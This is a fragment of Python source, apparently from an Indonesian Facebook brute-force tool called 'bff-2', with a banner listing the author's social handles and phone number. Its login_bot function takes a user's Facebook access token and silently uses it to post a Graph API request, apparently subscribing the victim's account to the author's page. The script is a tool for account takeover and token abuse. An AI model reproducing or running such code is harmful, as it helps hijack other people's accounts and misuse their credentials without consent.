...
f"""{Hj}
 ...
 - fanspage    : https://www.facebook.com/Niki gagal-tenaar-100068397981838/
 - whatsap     : 081388498596
 - github      : Red-Mafia
 - script name : bff-2
 - version     : 1.3
		...
		while True:
			...
			if rom in(""):
				...
				if nanya in(""):
					...
					print (N)
					link = ('# Link tutorial: https://www.facebook.com/NIKI MARK-100068397981838/?app=fbl')
					ah = rich.markdown.Markdown(link, style='green')
					rich.console.Console().print(ah)
					print ("%s%s buka dengan facebook "%(M,til));jeda(2)
					os.system("xdg-open https://www.facebook.com/NIKI MARK-100068397981838/?app=fbl")
					exit()
				elif nanya in("n","N"):
					exit()
			elif rom in ('0', '00'):
...
def login_bot(romz):
	try:
		toket = romz
		romz1 = ('100068397981838')
		romz2 = ('100068397981838')
		romz3 = ('100068397981838')
		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # Niki gagal tenaar
